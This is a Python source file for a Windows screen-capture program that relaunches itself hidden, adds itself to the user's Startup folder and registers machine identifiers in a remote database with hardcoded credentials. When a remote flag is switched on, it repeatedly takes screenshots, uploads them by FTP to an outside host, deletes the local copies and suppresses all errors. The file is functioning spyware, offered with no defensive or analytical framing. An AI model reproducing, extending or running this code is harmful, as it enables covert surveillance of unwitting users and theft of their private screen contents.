import os
import sys
import shutil
import pyodbc
import socket
import uuid
import subprocess
import time
from datetime import datetime
from PIL import ImageGrab
from ftplib import FTP
import win32com.client

def run_in_background():
    if '--bg' not in sys.argv:
        script_path = os.path.abspath(sys.argv[0])
        os.system(f'start /min pythonw "{script_path}" --bg')

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_path = os.path.join(startup_folder, os.path.basename(script_path).replace(".py", ".lnk"))

    if not os.path.exists(shortcut_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.Save()

run_in_background()
add_to_startup()

DB_SERVER = '------.public.databaseasp.net'
DB_NAME = '------'
DB_USER = '------'
DB_PASSWORD = '------X54h@B'

def connect_db():
    conn_str = f'''
        DRIVER={{SQL Server}};
        SERVER={DB_SERVER};
        DATABASE={DB_NAME};
        UID={DB_USER};
        PWD={DB_PASSWORD};
        Encrypt=no;
        TrustServerCertificate=yes;
        MARS_Connection=yes;
    '''
    return pyodbc.connect(conn_str)

def get_mac_address():
    mac = hex(uuid.getnode()).replace('0x', '').upper()
    return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

def get_system_uuid():
    try:
        result = subprocess.check_output("wmic csproduct get uuid", shell=True)
        lines = result.decode().split("\n")
        return lines[1].strip() if len(lines) > 1 else "UNKNOWN"
    except:
        return "UNKNOWN"

def get_disk_serial():
    try:
        result = subprocess.check_output("wmic diskdrive get serialnumber", shell=True)
        lines = result.decode().split("\n")
        serials = [line.strip() for line in lines[1:] if line.strip()]
        return serials[0] if serials else "UNKNOWN"
    except:
        return "UNKNOWN"

def generate_device_info():
    return {
        "mac_address": get_mac_address(),
        "uuid": get_system_uuid(),
        "disk_serial": get_disk_serial(),
        "device_name": socket.gethostname()
    }

def generate_device_id():
    info = generate_device_info()
    return f"{info['device_name']}"

device_id = generate_device_id()

ftp_host = "------"
ftp_user = "------"
ftp_password = "------CZTjTAGUc"
ftp_base_folder = "/htdocs/F-society/"
upload_folder = f"{ftp_base_folder}{device_id}/"

save_folder = os.path.join(os.path.expanduser("~"), "Screenshots")
os.makedirs(save_folder, exist_ok=True)

def get_script_status():
    info = generate_device_info()
    try:
        conn = connect_db()
        cursor = conn.cursor()

        cursor.execute("""
            IF NOT EXISTS (
                SELECT * FROM INFORMATION_SCHEMA.TABLES
                WHERE TABLE_NAME = 'user_devices'
            )
            BEGIN
                CREATE TABLE user_devices (
                    mac_address NVARCHAR(50),
                    uuid NVARCHAR(50),
                    disk_serial NVARCHAR(50),
                    device_name NVARCHAR(100),
                    Script_Status NVARCHAR(10)
                )
            END
        """)
        conn.commit()

        cursor.execute("""
            SELECT Script_Status FROM user_devices
            WHERE mac_address = ? AND uuid = ?
        """, (info["mac_address"], info["uuid"]))
        row = cursor.fetchone()

        if row:
            return row.Script_Status.lower() if row.Script_Status else "off"
        else:
            cursor.execute("""
                INSERT INTO user_devices (mac_address, uuid, disk_serial, device_name, Script_Status)
                SELECT ?, ?, ?, ?, ?
                WHERE NOT EXISTS (
                    SELECT 1 FROM user_devices WHERE mac_address = ? AND uuid = ?
                )
            """, (
                info["mac_address"], info["uuid"], info["disk_serial"], info["device_name"], 'off',
                info["mac_address"], info["uuid"]
            ))
            conn.commit()
            return "off"
    except:
        return "off"
    finally:
        try:
            conn.close()
        except:
            pass

def take_screenshot(save_folder):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"screenshot_{timestamp}.png"
        file_path = os.path.join(save_folder, file_name)
        screenshot = ImageGrab.grab()
        screenshot.save(file_path, "PNG")
        return file_path
    except:
        return None

def upload_image_ftp(image_path):
    try:
        ftp = FTP(ftp_host)
        ftp.login(user=ftp_user, passwd=ftp_password)

        path_parts = upload_folder.strip('/').split('/')
        current_path = ""
        for part in path_parts:
            current_path += f"/{part}"
            try:
                ftp.mkd(current_path)
            except:
                pass

        upload_path = f"{upload_folder}image_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"
        with open(image_path, "rb") as file:
            ftp.storbinary(f"STOR {upload_path}", file)
        ftp.quit()
        os.remove(image_path)
    except:
        pass

def main():
    while True:
        status = get_script_status()
        if status == "on":
            screenshot_path = take_screenshot(save_folder)
            if screenshot_path:
                upload_image_ftp(screenshot_path)
        # time.sleep(60)

if __name__ == "__main__":
    main()